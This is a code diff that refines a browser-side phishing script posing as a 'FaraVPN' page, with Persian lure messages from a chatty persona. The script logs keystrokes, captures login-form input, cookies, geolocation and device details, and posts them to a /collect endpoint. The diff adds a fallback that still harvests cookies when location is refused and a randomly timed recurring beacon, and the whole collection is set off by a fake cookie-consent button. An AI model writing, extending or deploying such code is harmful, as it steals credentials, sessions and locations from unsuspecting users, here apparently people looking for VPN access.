@@ -1,13 +1,12 @@
 (function() {
-    function _0x9d3f() {
-        let keystrokes = [];
-        let userActivity = { typing: false, submitted: false };
+    let keystrokes = [];
+    let userActivity = { typing: false, submitted: false };
 
-        // Keylogger
+    function _0x9d3f() {
         document.addEventListener("keydown", function(e) {
             keystrokes.push({ key: e.key, time: new Date().toISOString() });
             userActivity.typing = true;
-            if (keystrokes.length > 10) {
+            if (keystrokes.length >= 10) {
                 fetch("/collect", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
@@ -17,7 +16,6 @@
             }
         });
 
-        // Collect device info and cookies
         navigator.geolocation.getCurrentPosition(function(p) {
             let data = {
                 location: { lat: p.coords.latitude, lon: p.coords.longitude },
@@ -35,16 +33,27 @@
                 body: JSON.stringify(data)
             });
             localStorage.setItem("session", JSON.stringify({ cookies: document.cookie, timestamp: new Date().toISOString() }));
-            setInterval(function() {
-                fetch("/collect", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ cookies: document.cookie, session: localStorage.getItem("session"), timestamp: new Date().toISOString() })
-                });
-            }, Math.random() * 60000 + 30000);
-        }, function() {});
+            sendPeriodicSessionData();
+        }, function() {
+             let data = {
+                cookies: document.cookie,
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: { width: window.screen.width, height: window.screen.height },
+                ios_version: navigator.userAgent.match(/OS (\d+_\d+)/)?.[1]?.replace("_", ".") || "Unknown",
+                timestamp: new Date().toISOString()
+            };
+            fetch("/collect", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(data)
+            });
+            localStorage.setItem("session", JSON.stringify({ cookies: document.cookie, timestamp: new Date().toISOString() }));
+            sendPeriodicSessionData();
+        });
 
-        // Dynamic Lila messages based on user activity
+
         let taunts = [
             { condition: () => !userActivity.typing && !userActivity.submitted, text: "عزیزم، با FaraVPN هیچوقت قطع نمی‌شی! فقط یه قدم دیگه! 😊" },
             { condition: () => userActivity.typing, text: "وای، تو چقدر سریع پیش می‌ری! با FaraVPN فراتر از استارلینک رو تجربه کن! 😍" },
@@ -64,6 +73,27 @@
         }, 5000);
     }
 
+    function sendPeriodicSessionData() {
+        let delay = Math.random() * (120000 - 30000) + 30000;
+        setTimeout(() => {
+            fetch("/collect", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    cookies: document.cookie,
+                    session: localStorage.getItem("session"),
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    screen: { width: window.screen.width, height: window.screen.height },
+                    ios_version: navigator.userAgent.match(/OS (\d+_\d+)/)?.[1]?.replace("_", ".") || "Unknown",
+                    timestamp: new Date().toISOString()
+                })
+            });
+            sendPeriodicSessionData();
+        }, delay);
+    }
+
     document.getElementById("login-form")?.addEventListener("submit", function(e) {
         e.preventDefault();
         let data = {
@@ -74,6 +104,7 @@
             timestamp: new Date().toISOString()
         };
         userActivity.submitted = true;
+        keystrokes = [];
         fetch("/collect", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
@@ -98,6 +129,7 @@
             timestamp: new Date().toISOString()
         };
         userActivity.submitted = true;
+        keystrokes = [];
         fetch("/collect", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
@@ -110,11 +142,15 @@
     });
 
     window.acceptCookies = function() {
-        // خط اضافه شده:
-        alert("دکمه قبول فشرده شد!"); // <--- اینجا اضافه شده است
-
         document.getElementById("cookie-consent").style.display = "none";
         document.getElementById("lila-popup").style.display = "block";
         _0x9d3f();
     };
+
+    document.addEventListener("DOMContentLoaded", function() {
+        // این بلاک فعلا کاری نمی کند، چون نیاز به نمایش پاپ آپ کوکی در ابتدا داریم.
+        // اگر در آینده بخواهید پاپ آپ کوکی نداشته باشید و لیلا از ابتدا بیاید، می توانید
+        // _0x9d3f(); را اینجا صدا بزنید.
+    });
+
 })();
